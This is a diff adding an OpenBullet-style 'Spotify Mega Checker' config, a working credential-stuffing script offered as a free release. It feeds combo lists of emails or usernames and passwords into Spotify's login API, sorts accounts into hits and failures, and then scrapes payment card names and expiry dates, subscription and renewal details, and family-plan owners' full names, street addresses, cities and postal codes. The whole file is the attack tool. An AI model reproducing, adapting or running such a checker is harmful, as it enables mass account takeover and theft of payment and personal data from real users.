@@ -1,0 +1,155 @@
+[SETTINGS]
+{
+  "Name": "Spotify_Mega_Checker_BY_ANCIENT_BANANA_FINAL♥",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-23T20:00:10.06435+05:30",
+  "AdditionalInfo": "Final Free Version. Proxies recommended but not absolutely required.",
+  "Author": "AncientBanana♥",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" EncodeContent=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#Login REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "InvalidCredentials" 
+  KEYCHAIN Success OR 
+    KEY "displayName" 
+
+#Capture REQUEST GET "https://www.spotify.com/uk/account/subscription/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture_CC PARSE "<SOURCE>" LR "\"><div class=\"payment-details-name\" title=\"" "\">" -> VAR "CC1" "" " " 
+
+#Capture_Exp PARSE "<SOURCE>" LR "\"payment-details-expiry\">" "<" -> VAR "Exp1" "" " " 
+
+#Capture REQUEST GET "https://www.spotify.com/uk/account/subscription/change/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture_Subscription PARSE "<SOURCE>" LR "<h2 class=\"your-plan-name\">" "<" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Capture_Subscription_Special2 PARSE "<SOURCE>" LR "h3 class=\"product-name\">" "</h3><p class=\"subscription-status\">" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Capture_Subscription_Special1 PARSE "<SOURCE>" LR "></svg></span>" "</h3><p class=\"subscription-status\">" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Capture_Subscription_Special3 PARSE "<SOURCE>" LR "<h2 class=\"your-plan-name\">" "<" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Capture_user_country PARSE "<SOURCE>" LR "'userCountry': '" "'" -> CAP "Country" 
+
+#TU_Country FUNCTION ToUppercase "<Country>" -> CAP "Country" 
+
+#Capture_Renewal PARSE "<SOURCE>" LR "<b class=\"recurring-date\">" "<" CreateEmpty=FALSE -> CAP "Renewal" 
+
+#Fix_CC FUNCTION Replace "&nbsp;" " " "<CC1>" -> CAP "CC" 
+
+#Fix_Exp FUNCTION Replace "Expires:" " " "<Exp1>" -> CAP "Exp" 
+
+#Capture_Family_Member PARSE "<SOURCE>" LR "<p class=\"your-plan-desc\">You're a m" ".</p>" CreateEmpty=FALSE -> CAP "Note" "M" "" 
+
+#Capture_Note PARSE "<SOURCE>" LR "=\"subscription-status\">" "<" CreateEmpty=FALSE -> CAP "Note" 
+
+#Account_Category_Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<Subscription>" Contains "Free" 
+    KEY "<Note>" Contains "You're currently Spotify Free" 
+  KEYCHAIN Success AND 
+    KEY "<Subscription>" Contains "Premium for Family" 
+    KEY "<Note>" DoesNotExist 
+    KEY "<Subscription>" DoesNotContain "Student" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<Subscription>" Contains "Premium" 
+    KEY "<Renewal>" DoesNotExist 
+
+#Family_Overview REQUEST GET "https://www.spotify.com/us/family/overview/" ParseQuery=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Magic_Starts_here PARSE "<SOURCE>" LR "familyPlanData: \"" "};" CreateEmpty=FALSE -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x20" " " "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x7B" "{" "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x22" "\"" "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x3A" ":" "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x2D" "-" "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x5D" "]" "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x5B" "[" "<FamilyData>" -> VAR "FamilyData" 
+
+#Fix_FamilyData FUNCTION Replace "\\x7D" "}" "<FamilyData>" -> VAR "FamilyData" 
+
+#Count_+_2 FUNCTION CountOccurrences "postalCode" "<FamilyData>" -> VAR "Count*" 
+
+#Count FUNCTION Compute "<Count*> - 3" -> VAR "Count1" 
+
+#Count_Fix FUNCTION Replace "-2" "0" "<Count1>" -> VAR "Count1" 
+
+#Final_Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<Count1>" Contains "-3" 
+  KEYCHAIN Failure OR 
+    KEY "<Note>" Contains "Free" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Subscription>" Contains "Student" 
+
+#MasterData PARSE "<FamilyData>" LR "\"master\":{" ",\"members\"" CreateEmpty=FALSE -> VAR "MasterData" 
+
+#Capture_Master_Username PARSE "<MasterData>" LR "\"username\":\"" "\"," CreateEmpty=FALSE -> CAP "Master_Username" 
+
+#Capture_Master_Zip_Code PARSE "<MasterData>" LR "postalCode\":\"" "\"" CreateEmpty=FALSE -> CAP "Master_Zip_Code" 
+
+#Capture_Master_City PARSE "<FamilyData>" LR "city\":\"" "\"" CreateEmpty=FALSE -> CAP "Master_City" 
+
+#Capture_Master_line1 PARSE "<FamilyData>" LR "\",\"line1\":\"" "\"" CreateEmpty=FALSE -> CAP "Master_line1" 
+
+#Capture_Master_Full_Name PARSE "<FamilyData>" LR "fullName\":\"" "\"" CreateEmpty=FALSE -> CAP "Master_FullName" 
+
+#Invite_Count FUNCTION Constant "<Count1>/5 invites are filled" -> CAP "Invites:" 
+
